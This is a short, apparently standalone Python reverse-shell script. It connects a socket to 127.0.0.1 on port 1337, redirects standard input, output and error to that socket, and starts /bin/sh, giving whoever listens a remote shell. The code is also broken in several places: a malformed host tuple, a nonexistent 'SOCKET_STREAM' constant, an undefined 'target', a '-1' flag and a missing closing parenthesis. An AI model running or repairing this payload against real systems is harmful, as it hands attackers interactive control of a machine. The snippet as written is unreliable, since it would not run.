import socket, subprocess, os;

host='127.0.0.1',
port=1337
s=socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
s.connect(target)

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(['/bin/sh','-1']
